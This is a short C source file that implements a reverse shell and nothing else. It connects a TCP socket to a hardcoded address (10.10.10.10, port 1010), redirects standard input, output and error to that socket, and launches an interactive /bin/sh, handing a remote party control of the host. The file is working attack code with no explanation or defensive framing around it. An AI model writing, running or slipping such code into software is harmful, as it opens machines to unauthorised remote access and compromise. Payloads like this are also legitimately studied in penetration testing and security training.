#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define myAddr "10.10.10.10"
#define myPort  1010

int main (int argc, char **argv) {
	
	int mySocket = socket(AF_INET,SOCK_STREAM,0);
	
	struct sockaddr_in sockinfo;
	
	sockinfo.sin_family  	 = AF_INET;
	sockinfo.sin_addr.s_addr = inet_addr(myAddr);
	sockinfo.sin_port 		 = htons(myPort);
	
	connect(mySocket,(struct sockaddr *)&sockinfo, sizeof(sockinfo));
	
	for (int i=0; i<3; i++) { dup2(mySocket, i);}
	
	execl("/bin/sh","sh","-i",NULL,NULL);
	
	return 0;
}